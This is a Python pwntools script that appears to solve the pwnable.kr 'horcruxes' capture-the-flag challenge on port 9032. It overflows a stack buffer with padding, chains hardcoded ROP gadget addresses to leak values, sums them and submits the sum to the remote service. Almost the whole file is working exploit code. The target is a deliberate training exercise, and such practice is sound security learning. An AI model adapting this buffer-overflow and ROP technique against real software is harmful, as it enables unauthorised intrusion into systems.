#coding=utf-8
from pwn import *

stack = 0xffffdb54
ret = 0xffffdbcc
A = 0x0809fe4b
B = 0x0809fe6a
C = 0x0809fe89
D = 0x0809fea8
E = 0x0809fec7
F = 0x0809fee6
G = 0x0809ff05
ropme = 0x809fffc

rop = [A, B, C, D, E, F, G, ropme]

r = remote('pwnable.kr', 9032)
r.sendline('1')
payload = 'a' * (ret - stack)

for ro in rop:
    payload += p32(ro)
r.sendline(payload)

res = r.recv(1000)
res = r.recv(1000)
print res
exp = res.split('+')[1:]
for i in range(len(exp)):
    exp[i] = exp[i].split(')')[0]
print exp

sum_ = 0
for e in exp:
    sum_ += int(e)
print sum_

r.sendline('1')
r.sendlineafter('How many EXP did you earned?', str(sum_))
print r.recvall(1)
